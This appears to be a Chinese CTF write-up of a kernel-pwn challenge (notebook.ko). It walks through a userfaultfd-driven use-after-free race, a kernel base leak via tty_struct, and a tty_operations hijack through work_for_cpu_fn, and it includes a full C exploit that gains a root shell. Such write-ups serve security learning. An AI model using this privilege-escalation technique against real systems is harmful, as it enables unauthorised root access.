    <url>/posts/13939393.html</url>
    <content><![CDATA[<blockquote>
<p>抄袭的 a3 大佬的博客，各位师傅轻喷</p>
</blockquote>
<p>使用内核模块实现了一个菜单题:</p>
<h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><p>从qemu启动脚本可以看到开启了smep,smap,kaslr保护机制</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">stty intr ^]</span><br><span class="line">exec timeout 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append &quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot; -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2&gt;/dev/null -s</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看内核init脚本，禁止查看&#x2F;proc&#x2F;kallsyms和dmesg</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br></pre></td></tr></table></figure>
<p>启动内核查看保护机制，发现开启KPTI保护</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/ $ grep flags /proc/cpuinfo -m 1 | grep pti</span><br><span class="line">flags           : fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall nx lm constant_tsc nopl xtopology cpuid pni cx16 hyperv</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>查看漏洞模块notebook.ko，（挺不错，没有去符号:-)）该模块初始化了一个设备&#x2F;dev&#x2F;notebook。定义了read，write，ioctl操作函数，但是read没有定义在mynote_fops里。</p>
<img src="/posts/13939393/file-20250810105657464.png" class="">
<p>read函数读取全局变量notebook的指定index的内容</p>
<img src="/posts/13939393/file-20250810110411850.png" class="">
<p>write函数向notebook指定index写入buf数据</p>
<img src="/posts/13939393/file-20250810110451584.png" class="">
<p>ioctl函数则是定义了四个命令，分别是add，del，edit，gift四个功能<br>add功能，添加idx：</p>
<img src="/posts/13939393/file-20250810111354289.png" class="">
<p>gift功能，可以读取notebook的内容，可以用来泄漏内核基址，或者堆地址的解密：</p>
<img src="/posts/13939393/file-20250810111313037.png" class="">
<p>del功能，释放指定idx的chunk，但是会清零，不存在uaf漏洞：</p>
<img src="/posts/13939393/file-20250810111433048.png" class="">
<p>edit功能，用于调整chunk大小，这里使用读锁（可以允许多个进程进入临界区，从而可以出现UAF），</p>
<img src="/posts/13939393/file-20250810111625029.png" class="">
<p>exit函数会执行kfree，释放内存。</p>
<img src="/posts/13939393/file-20250810110016094.png" class="">
<p>构造交互程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  * Kernel Pwn Infrastructures</span></span><br><span class="line"><span class="comment"> *  **/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS_MSG(msg)    <span class="string">&quot;\033[32m\033[1m[+]&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg)       <span class="string">&quot;\033[34m\033[1m[*]&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR_MSG(msg)      <span class="string">&quot;\033[31m\033[1m[x]&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_FILE_NUM		5</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">UserArg</span> &#123;</span></span><br><span class="line">	<span class="type">size_t</span> idx;</span><br><span class="line">	<span class="type">size_t</span> size;</span><br><span class="line">	<span class="type">size_t</span> *name_ptr;</span><br><span class="line">&#125;userarg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_note</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> UserArg *userarg)</span> &#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x100</span>, userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> UserArg *userarg)</span> &#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x64</span>, userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del_note</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> UserArg *userarg)</span> &#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x200</span>, userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit_note</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> UserArg *userarg)</span> &#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x300</span>, userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">// initialize</span></span><br><span class="line">	<span class="type">int</span> dev_fd[DEVICE_FILE_NUM];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">UserArg</span> <span class="title">userarg</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// open device</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt; DEVICE_FILE_NUM; i++) &#123;</span><br><span class="line">		dev_fd[i] = open(<span class="string">&quot;/dev/notebook&quot;</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (dev_fd[i] &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;[x] open device %d failed!\n&quot;</span>, i);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] open device %d success!\n&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// write hello world with name Alice</span></span><br><span class="line">	<span class="type">char</span> *msg = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">	<span class="type">char</span> *name = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">	userarg.idx = <span class="number">1</span>;</span><br><span class="line">	userarg.size = <span class="number">0x60</span>;</span><br><span class="line">	userarg.name_ptr = name;</span><br><span class="line">	add_note(dev_fd[<span class="number">0</span>], &amp;userarg);</span><br><span class="line">	write(dev_fd[<span class="number">0</span>], msg, <span class="number">1</span>);</span><br><span class="line">	<span class="comment">// read note</span></span><br><span class="line">	<span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">	read(dev_fd[<span class="number">0</span>], buf, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] read note 1: %s&quot;</span>, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="Step1-userfaultfd构造UAF"><a href="#Step1-userfaultfd构造UAF" class="headerlink" title="Step1. userfaultfd构造UAF"></a>Step1. userfaultfd构造UAF</h3><p>在edit函数使用krealloc重分配object,随后使用copy_from_user从用户空间拷贝数据，因此可以分配一个特定大小的note,然后新开一个edit线程通过krealloc(0)将其释放，并且通过userfaultfd卡在这里。此时notebook数组中的object还不会被清空，此时我们只需要将其分配到其他内核结构体上即可实现UAF.</p>
<p>这里选择<code>tty_struct</code>完成利用，打开<code>/dev/ptmx</code>即可。</p>
<h3 id="Step2-泄漏内核基址"><a href="#Step2-泄漏内核基址" class="headerlink" title="Step2. 泄漏内核基址"></a>Step2. 泄漏内核基址</h3><p>可以直接通过<code>tty_struct</code>的<code>tty_operations</code>泄漏内核基地址，其通常被初始化为全局变量<code>ptm_unix98_ops</code>或<code>pty_unix98_ops</code>。</p>
<p>需要注意题目中读写会检查notebook数组中的size,而在我们通过krealloc(0)构建的UAF时其被修改为 0，因此我们需要将其修改为非0。这里发现noteadd会先修改notebook的size再进行copy_from_user()，可以利用这个来进行userfaultfd,通过noteadd来修改size.（如果使用edit会调用krealloc将原object覆盖）</p>
<h3 id="Step3-劫持-tty-operations，控制内核执行流，work-for-cpu-fn-稳定化利用"><a href="#Step3-劫持-tty-operations，控制内核执行流，work-for-cpu-fn-稳定化利用" class="headerlink" title="Step3. 劫持 tty_operations，控制内核执行流，work_for_cpu_fn() 稳定化利用"></a>Step3. 劫持 tty_operations，控制内核执行流，work_for_cpu_fn() 稳定化利用</h3><p>可以直接通过write来写入堆块从而修改tty_struct-&gt;tty_operations劫持内核执行流，同时notegift会白给notebook中的object地址，这样我们可以直接将fake tty_operation布置到note中。</p>
<p>这里选择使用<code>work_for_cpu_fn()</code>来完成利用，在开启多核支持的内核中都有该函数，定义于<code>kernel/workqueue.c</code>中:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="type">long</span> (*fn)(<span class="type">void</span> *);</span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">work_for_cpu_fn</span><span class="params">(<span class="keyword">struct</span> work_struct *work)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, <span class="keyword">struct</span> work_for_cpu, work);</span><br><span class="line"></span><br><span class="line">    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其函数可以理解为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">work_for_cpu_fn</span><span class="params">(<span class="type">size_t</span> * args)</span></span><br><span class="line">&#123;</span><br><span class="line">    args[<span class="number">6</span>] = ((<span class="type">size_t</span> (*) (<span class="type">size_t</span>)) (args[<span class="number">4</span>](args[<span class="number">5</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即从<code>rdi+0x20</code>处作为函数指针，<code>rdi+0x28</code>作为参数，返回值位于<code>rdi+0x30</code>，而tty_operation的函数指针的第一个参数为tty_struct,对我们而言可控，因此我们可以直接执行<code>prepare_kernel_cred</code>和<code>commit_creds</code>，且不用考虑KPTI。</p>
<p>需要注意<code>tty_struct</code>结构被破坏了，在完成提权后需要将其内容恢复原样。</p>
<p>然后就是竞态条件通过创建新线程的方式需要主线程sleep等待一下。</p>
<p>最终exp如下，”kernelpwn.h”为a3大佬提供的文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  * Kernel Pwn Infrastructures</span></span><br><span class="line"><span class="comment"> *  **/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS_MSG(msg)    <span class="string">&quot;\033[32m\033[1m[+] &quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg)       <span class="string">&quot;\033[34m\033[1m[*] &quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR_MSG(msg)      <span class="string">&quot;\033[31m\033[1m[x] &quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE         0x2e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTY_UNIX98_OPS          0xffffffff81e8e320</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTM_UNIX98_OPS          0xffffffff81e8e440</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WORK_FOR_CPU_FUNC       0xffffffff8109eb90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS            0xffffffff810a9b40</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NOTE_NUM 16</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">UserArg</span> &#123;</span></span><br><span class="line">        <span class="type">size_t</span> idx;</span><br><span class="line">        <span class="type">size_t</span> size;</span><br><span class="line">        <span class="type">char</span> *name_ptr;</span><br><span class="line">&#125;userarg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">KernelNotebook</span> &#123;</span></span><br><span class="line">        <span class="type">void</span> *ptr;</span><br><span class="line">        <span class="type">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">sem_t</span> evil_add_sem, evil_edit_sem;</span><br><span class="line"><span class="type">char</span> temp_page[<span class="number">0x1000</span>] = &#123;<span class="string">&quot;eutopia0&quot;</span>&#125;;</span><br><span class="line"><span class="type">char</span> * uffd_buf;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">note_add</span><span class="params">(<span class="type">size_t</span> index, <span class="type">size_t</span> size, <span class="type">char</span> *name_ptr)</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">UserArg</span> <span class="title">userarg</span> =</span> &#123;</span><br><span class="line">                .idx = index,</span><br><span class="line">                .size = size,</span><br><span class="line">                .name_ptr = name_ptr</span><br><span class="line">        &#125;;</span><br><span class="line">        ioctl(dev_fd, <span class="number">0x100</span>, &amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">(<span class="type">char</span> *name_ptr)</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">UserArg</span> <span class="title">userarg</span> =</span> &#123;</span><br><span class="line">                .name_ptr = name_ptr</span><br><span class="line">        &#125;;</span><br><span class="line">        ioctl(dev_fd, <span class="number">0x64</span>, &amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">note_del</span><span class="params">(<span class="type">size_t</span> index)</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">UserArg</span> <span class="title">userarg</span> =</span> &#123;</span><br><span class="line">                .idx = index</span><br><span class="line">        &#125;;</span><br><span class="line">        ioctl(dev_fd, <span class="number">0x200</span>, &amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">note_edit</span><span class="params">(<span class="type">size_t</span> index, <span class="type">size_t</span> size, <span class="type">char</span> *name_ptr)</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">UserArg</span> <span class="title">userarg</span> =</span> &#123;</span><br><span class="line">                .idx = index,</span><br><span class="line">                .size = size,</span><br><span class="line">                .name_ptr = name_ptr</span><br><span class="line">        &#125;;</span><br><span class="line">        ioctl(dev_fd, <span class="number">0x300</span>, &amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">note_read</span><span class="params">(<span class="type">int</span> idx, <span class="type">void</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">return</span> read(dev_fd, buf, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">note_write</span><span class="params">(<span class="type">int</span> idx, <span class="type">void</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">return</span> write(dev_fd, buf, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fix_size</span><span class="params">(<span class="type">void</span> * args)</span> &#123;</span><br><span class="line">        sem_wait(&amp;evil_add_sem);</span><br><span class="line">        note_add(<span class="number">0</span>, <span class="number">0x60</span>, uffd_buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">construct_uaf</span><span class="params">(<span class="type">void</span> * args)</span> &#123;</span><br><span class="line">        sem_wait(&amp;evil_edit_sem);</span><br><span class="line">        note_edit(<span class="number">0</span>, <span class="number">0</span>, uffd_buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// basic work</span></span><br><span class="line">        bind_core(<span class="number">0</span>);</span><br><span class="line">        save_status();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// initialize</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">KernelNotebook</span> <span class="title">notes</span>[<span class="title">NOTE_NUM</span>];</span></span><br><span class="line">        <span class="type">int</span> tty_fd;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">fake_tty_ops</span>;</span></span><br><span class="line">        <span class="type">pthread_t</span> uffd_monitor_thread, add_fix_size_thread, edit_uaf_thread;</span><br><span class="line">        <span class="type">size_t</span> fake_tty_struct_data[<span class="number">0x100</span>], tty_ops, orig_tty_struct_data[<span class="number">0x100</span>];</span><br><span class="line">        <span class="type">size_t</span> tty_struct_addr, fake_tty_ops_addr;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">UserArg</span> <span class="title">userarg</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// init sem</span></span><br><span class="line">        sem_init(&amp;evil_add_sem, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        sem_init(&amp;evil_edit_sem, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// open device</span></span><br><span class="line">        dev_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (dev_fd &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] open device failed!\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] open device success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        log_info(<span class="string">&quot;Step1: construct UAF by userfaultfd&quot;</span>);</span><br><span class="line">        <span class="comment">// add note with TTY_STRUCT_SIZE</span></span><br><span class="line">        note_add(<span class="number">0</span>, <span class="number">0x10</span>, <span class="string">&quot;eutopia0&quot;</span>);</span><br><span class="line">        note_edit(<span class="number">0</span>, TTY_STRUCT_SIZE, temp_page);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// register userfaultfd</span></span><br><span class="line">        uffd_buf = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        register_userfaultfd_for_thread_stucking(&amp;uffd_monitor_thread, uffd_buf, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">        pthread_create(&amp;edit_uaf_thread, <span class="literal">NULL</span>, (<span class="type">void</span> *)construct_uaf, <span class="literal">NULL</span>);</span><br><span class="line">        pthread_create(&amp;add_fix_size_thread, <span class="literal">NULL</span>, (<span class="type">void</span> *)fix_size, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        sem_post(&amp;evil_edit_sem);</span><br><span class="line">        <span class="comment">// need to edit first and then add</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        sem_post(&amp;evil_add_sem);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        log_info(<span class="string">&quot;Step2: Leaking kernel base by tty_struct&quot;</span>);</span><br><span class="line">        <span class="comment">// open /dev/ptmx to get kfree note object, need to sleep 1s to wait for note object to be kfreed</span></span><br><span class="line">        tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        note_read(<span class="number">0</span>, orig_tty_struct_data);</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span> *) orig_tty_struct_data != <span class="number">0x5401</span>) &#123;</span><br><span class="line">                err_exit(<span class="string">&quot;failed to hit the tty_struct!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        tty_ops = orig_tty_struct_data[<span class="number">3</span>];</span><br><span class="line">        kernel_offset = ((tty_ops &amp; <span class="number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="number">0xfff</span>)</span><br><span class="line">                                                ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);</span><br><span class="line">        kernel_base += kernel_offset;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] Kernel offset: 0x%lx\n&quot;</span>, kernel_offset);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Kernel base: 0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">        fake_tty_ops.ioctl = (<span class="type">void</span> *)(kernel_offset + WORK_FOR_CPU_FUNC);</span><br><span class="line">        note_add(<span class="number">1</span>, <span class="number">0x50</span>, temp_page);</span><br><span class="line">        note_edit(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_operations), temp_page);</span><br><span class="line">        note_write(<span class="number">1</span>, &amp;fake_tty_ops);</span><br><span class="line"></span><br><span class="line">        log_info(<span class="string">&quot;Step3: Leaking Kernel heap addr by gift...&quot;</span>);</span><br><span class="line">        gift((<span class="type">char</span> *)&amp;notes);</span><br><span class="line">        tty_struct_addr = (<span class="type">size_t</span>) notes[<span class="number">0</span>].ptr;</span><br><span class="line">        fake_tty_ops_addr = (<span class="type">size_t</span>) notes[<span class="number">1</span>].ptr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] tty_struct addr: 0x%lx\n&quot;</span>, tty_struct_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] fake_tty_ops_addr: 0x%lx\n&quot;</span>, fake_tty_ops_addr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// prepare_kernel_cred(NULL)</span></span><br><span class="line">        log_info(<span class="string">&quot;Step3: Trigger commit_creds(prepare_kernel_cred(NULL)) and fix tty&quot;</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(fake_tty_struct_data, orig_tty_struct_data, TTY_STRUCT_SIZE);</span><br><span class="line">        fake_tty_struct_data[<span class="number">3</span>] = fake_tty_ops_addr;</span><br><span class="line">        fake_tty_struct_data[<span class="number">4</span>] = kernel_offset + PREPARE_KERNEL_CRED;</span><br><span class="line">        fake_tty_struct_data[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        note_write(<span class="number">0</span>, fake_tty_struct_data);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// trigger work_for_cpu_fn</span></span><br><span class="line">        ioctl(tty_fd, <span class="number">233</span>, <span class="number">233</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// commit_creds(prepare_kernel_cred(NULL))</span></span><br><span class="line">        note_read(<span class="number">0</span>, fake_tty_struct_data);</span><br><span class="line">        fake_tty_struct_data[<span class="number">4</span>] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">        fake_tty_struct_data[<span class="number">5</span>] = fake_tty_struct_data[<span class="number">6</span>];</span><br><span class="line">        fake_tty_struct_data[<span class="number">6</span>] = orig_tty_struct_data[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">        note_write(<span class="number">0</span>, fake_tty_struct_data);</span><br><span class="line">        ioctl(tty_fd, <span class="number">233</span>, <span class="number">233</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(fake_tty_struct_data, orig_tty_struct_data, TTY_STRUCT_SIZE);</span><br><span class="line">        note_write(<span class="number">0</span>, fake_tty_struct_data);</span><br><span class="line"></span><br><span class="line">        get_root_shell();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x05-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%EF%BC%88Race-condition%EF%BC%89">https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x05-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%EF%BC%88Race-condition%EF%BC%89</a></p>
]]></content>
  </entry>
  <entry>
